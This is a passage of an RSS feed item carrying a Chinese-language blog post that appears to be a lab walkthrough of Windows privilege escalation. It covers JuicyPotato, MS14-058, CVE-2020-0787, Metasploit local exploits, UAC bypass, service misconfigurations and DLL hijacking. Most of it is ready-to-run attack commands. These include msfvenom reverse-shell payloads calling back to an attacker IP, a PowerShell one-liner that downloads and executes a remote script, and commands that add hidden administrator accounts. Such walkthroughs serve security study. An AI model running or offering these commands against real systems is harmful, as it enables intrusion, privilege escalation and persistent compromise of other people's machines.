&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==&#34;&gt;https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;找到了可读写目录上传 exe&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png&#34; alt=&#34;image-20231110153059031&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;p&gt;C:\inetpub\wwwroot\dedecms\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;amp;&amp;amp; net localgroup administrators yunyi/add&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png&#34; alt=&#34;image-20231110160256590&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ms14-058提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms14-058提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS14-058 提权&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。&lt;/p&gt;
&lt;p&gt;影响版本&lt;br&gt;
 Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下&lt;/p&gt;
&lt;p&gt;上传 exe 到可执行目录&lt;/p&gt;
&lt;p&gt;whoami 看到已经是 nt authority\system&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png&#34; alt=&#34;image-20231110182725492&#34;&gt;&lt;/p&gt;
&lt;p&gt;64.exe “net user yunyi 123456 /add” 添加用户&lt;/p&gt;
&lt;p&gt;64.exe &amp;quot;net localgroup administrators yunyi /add&amp;quot; 添加到管理员组&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png&#34; alt=&#34;image-20231110182123803&#34;&gt;&lt;/p&gt;
&lt;p&gt;远程端口连接成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png&#34; alt=&#34;image-20231110182617605&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;cve-2020-0787&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2020-0787&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;CVE-2020-0787&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;Windows 10 Version 1809 for ARM64-based Systems&lt;br&gt;
Windows Server 2008 for 32-bit Systems Service Pack 2&lt;br&gt;
Windows RT 8.1&lt;br&gt;
Windows 8.1 for x64-based systems&lt;br&gt;
Windows 8.1 for 32-bit systems&lt;br&gt;
Windows 7 for x64-based Systems Service Pack 1&lt;br&gt;
Windows 7 for 32-bit Systems Service Pack 1&lt;br&gt;
Windows Server 2016 (Server Core installation)&lt;br&gt;
Windows Server 2016&lt;br&gt;
Windows 10 Version 1607 for x64-based Systems&lt;br&gt;
Windows 10 Version 1607 for 32-bit Systems&lt;br&gt;
Windows 10 for x64-based Systems&lt;br&gt;
Windows 10 for 32-bit Systems&lt;br&gt;
Windows Server, version 1903 (Server Core installation)&lt;br&gt;
Windows 10 Version 1903 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1903 for x64-based Systems&lt;br&gt;
Windows 10 Version 1903 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1709 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1709 for x64-based Systems&lt;br&gt;
Windows 10 Version 1709 for 32-bit Systems&lt;br&gt;
Windows Server, version 1909 (Server Core installation)&lt;br&gt;
Windows 10 Version 1909 for ARM64-based Systems&lt;br&gt;
Windows 10 Version 1909 for x64-based Systems&lt;br&gt;
Windows 10 Version 1909 for 32-bit Systems&lt;br&gt;
Windows Server 2019 (Server Core installation)&lt;br&gt;
Windows Server 2019&lt;br&gt;
Windows Server 2012 R2 (Server Core installation)&lt;br&gt;
Windows Server 2012 R2&lt;br&gt;
Windows Server 2012 (Server Core installation)&lt;br&gt;
Windows Server 2012&lt;br&gt;
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)&lt;br&gt;
Windows Server 2008 R2 for x64-based Systems Service Pack 1&lt;br&gt;
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)&lt;br&gt;
Windows Server 2008 for x64-based Systems Service Pack 2&lt;br&gt;
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)&lt;br&gt;
Windows 10 Version 1809 for x64-based Systems&lt;br&gt;
Windows 10 Version 1809 for 32-bit Systems&lt;br&gt;
Windows 10 Version 1803 for ARM64-based Systems&lt;br&gt;
Windows Server, version 1803 (Server Core Installation)&lt;br&gt;
Windows 10 Version 1803 for x64-based Systems&lt;br&gt;
Windows 10 Version 1803 for 32-bit Systems&lt;/p&gt;
&lt;p&gt;脚本地址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x&#34;&gt;https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;要求上桌面执行，会弹出系统权限的 cmd&lt;/p&gt;
&lt;p&gt;把 exe 上传后切换上面创建的用户登陆桌面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png&#34; alt=&#34;image-20231110185051791&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行后弹出 cmd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png&#34; alt=&#34;image-20231110185214126&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png&#34; alt=&#34;image-20231110185227277&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;msf利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf利用&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;msf 利用&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;先生成一个木马文件&lt;/p&gt;
&lt;p&gt;msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &amp;gt;/vs.exe&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png&#34; alt=&#34;image-20231110211226995&#34;&gt;&lt;/p&gt;
&lt;p&gt;msf 打开监听&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;set lhost 192.168.27.11&lt;/p&gt;
&lt;p&gt;set lport 8989&lt;/p&gt;
&lt;p&gt;exploit&lt;/p&gt;
&lt;p&gt;用 webshell 上传到受害机执行木马文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png&#34; alt=&#34;image-20231110213027928&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png&#34; alt=&#34;image-20231110213439218&#34;&gt;&lt;/p&gt;
&lt;p&gt;跟之前一样查看打了那些补丁&lt;/p&gt;
&lt;p&gt;输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png&#34; alt=&#34;image-20231110214317729&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png&#34; alt=&#34;image-20231110214725591&#34;&gt;&lt;/p&gt;
&lt;p&gt;search ms14_058 查找漏洞信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png&#34; alt=&#34;image-20231110214943295&#34;&gt;&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/ms14_058_track_popup_menu&lt;/p&gt;
&lt;p&gt;show options 查看利用要求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png&#34; alt=&#34;image-20231110215511454&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置会话 id 刚才看的是 session 2 所以设置为 2&lt;/p&gt;
&lt;p&gt;set session 2&lt;/p&gt;
&lt;p&gt;然后 exploit 执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png&#34; alt=&#34;image-20231110220237813&#34;&gt;&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/ms16_075_reflection_juicy&lt;/p&gt;
&lt;p&gt;ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限&lt;/p&gt;
&lt;p&gt;切换 shell 添加用户并加入管理员&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png&#34; alt=&#34;image-20231110221425934&#34;&gt;&lt;/p&gt;
&lt;p&gt;维权&lt;/p&gt;
&lt;p&gt;ps 列出进程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png&#34; alt=&#34;image-20231110221951490&#34;&gt;&lt;/p&gt;
&lt;p&gt;migrate 1184&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png&#34; alt=&#34;image-20231110222507771&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;uac提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uac提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;UAC 提权&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;用户账户控制（UAC）是 Windows 操作系统中的一项安全特性。它旨在帮助防止未经授权的对计算机的更改。当一个程序尝试执行需要管理员权限的更改时，UAC 会通知用户并在允许更改之前征得用户的确认。&lt;/p&gt;
&lt;p&gt;UAC 通过确保只有在用户明确同意的情况下才执行管理操作，有助于降低未经授权的更改和恶意软件安装的风险。这样，即使用户以管理员身份登录，他们仍然需要确认他们意图执行可能对系统造成影响的某些操作。&lt;/p&gt;
&lt;p&gt;前提：已获取目标本地用户权限&lt;/p&gt;
&lt;p&gt;上传 msf 木马执行&lt;/p&gt;
&lt;p&gt;现在为普通用户权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102136583.png&#34; alt=&#34;image-20231111102136583&#34;&gt;&lt;/p&gt;
&lt;p&gt;search 搜索一下 UAC 利用模块&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111100615934.png&#34; alt=&#34;image-20231111100615934&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 exploit/windows/local/bypassuac 模块&lt;/p&gt;
&lt;p&gt;set session 5&lt;/p&gt;
&lt;p&gt;run&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102853388.png&#34; alt=&#34;image-20231111102853388&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行成功过后再使用 getsystem&lt;/p&gt;
&lt;p&gt;getuid 查看已经是 system 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111102946311.png&#34; alt=&#34;image-20231111102946311&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows系统配置错误提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows系统配置错误提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;windows 系统配置错误提权&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&#34;系统服务权限配置错误&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统服务权限配置错误&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;系统服务权限配置错误&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;Windows 在系统启动时，会伴随着一些高权服务启动 (windows 服务是以 system 权限运行的) 如果某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持&lt;/p&gt;
&lt;p&gt;如果一个低权限用户对系统服务调用的可执行文件有写权限，他们可以替换该文件，并在系统启动时获取控制权限。尽管 Windows 服务以 system 权限运行，其文件夹、文件和注册表项受到强制访问控制的保护，但在某些情况下，仍可能存在一些缺乏有效保护的服务。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;Metasploit&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上线木马当前是 iis 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112119228.png&#34; alt=&#34;image-20231111112119228&#34;&gt;&lt;/p&gt;
&lt;p&gt;background 把会话放在后台&lt;/p&gt;
&lt;p&gt;切换到 use exploit/windows/local/service_permissions 攻击模块&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112359457.png&#34; alt=&#34;image-20231111112359457&#34;&gt;&lt;/p&gt;
&lt;p&gt;set session 4&lt;/p&gt;
&lt;p&gt;设置为 session 4&lt;/p&gt;
&lt;p&gt;exploit 执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111112807154.png&#34; alt=&#34;image-20231111112807154&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;PrivescCheck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;脚本地址&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2l0bTRuL1ByaXZlc2NDaGVjaw==&#34;&gt; https://github.com/itm4n/PrivescCheck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;列举共同 Windows 配置问题  ，可以利用当地的权限升级&lt;/p&gt;
&lt;p&gt;使用 1:   基本的使用情况&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell -ep bypass -c &amp;quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;远程使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell -nop -exec bypass -c &amp;quot;IEX (New-Object 
Net.WebClient).DownloadString(&#39;http://192.168.27.11/PrivescCheck.ps1&#39;); Invoke-PrivescCheck&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;PowerUp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;导入并执行脚本 powershell.exe -exec bypass -command “&amp;amp;{Import-Module .\PowerUp.ps1;Invoke-AllChecks}”&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111173012800.png&#34; alt=&#34;image-20231111173012800&#34;&gt;&lt;/p&gt;
&lt;p&gt;StartName    : LocalSystem&lt;/p&gt;
&lt;p&gt;AbuseFunction  : Install-ServiceBinary -ServiceName ‘MongoDB’&lt;/p&gt;
&lt;p&gt;利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当可直接添加管理员用户&lt;/p&gt;
&lt;p&gt;添加管理员&lt;/p&gt;
&lt;p&gt;powershell.exe -exec bypass -command “&amp;amp;{Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName ‘MongoDB’ -UserName yunyi4 -Password admin}”&lt;/p&gt;
&lt;p&gt;服务被重启或者计算机重启后就可以添加成功了&lt;/p&gt;
&lt;h4 id=&#34;不带引号的服务路径&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不带引号的服务路径&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;不带引号的服务路径&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。&lt;/p&gt;
&lt;p&gt;使用命令查看服务器存在空格，路径可写 即存在漏洞&lt;/p&gt;
&lt;p&gt;wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\Windows\” |findstr /i /v “”&amp;quot;&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;p&gt;C:\Program Files&lt;br&gt;
(x86)\2345Soft\2345Pic\protect\Pic_2345Svc.exe    Auto&lt;/p&gt;
&lt;p&gt;这种存在空格&lt;/p&gt;
&lt;p&gt;msf 生成一个 program.exe 放在 c 应用重启即可上线&lt;/p&gt;
&lt;h3 id=&#34;dll劫持提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dll劫持提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;DLL 劫持提权&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;查看应用进程找数字签名或者未知文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191157012.png&#34; alt=&#34;image-20231111191157012&#34;&gt;&lt;/p&gt;
&lt;p&gt;生成一个名字一样的 dll 并且替换&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=6789 -f dll &amp;gt; /root/2345MgrDLL.dll&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191517160.png&#34; alt=&#34;image-20231111191517160&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191909318.png&#34; alt=&#34;image-20231111191909318&#34;&gt;&lt;/p&gt;
&lt;p&gt;msf 上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111192614857.png&#34; alt=&#34;image-20231111192614857&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/</guid>
            <title>域环境</title>
            <link>http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/</link>
            <pubDate>Mon, 30 Oct 2023 12:00:34 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
    </channel>
</rss>
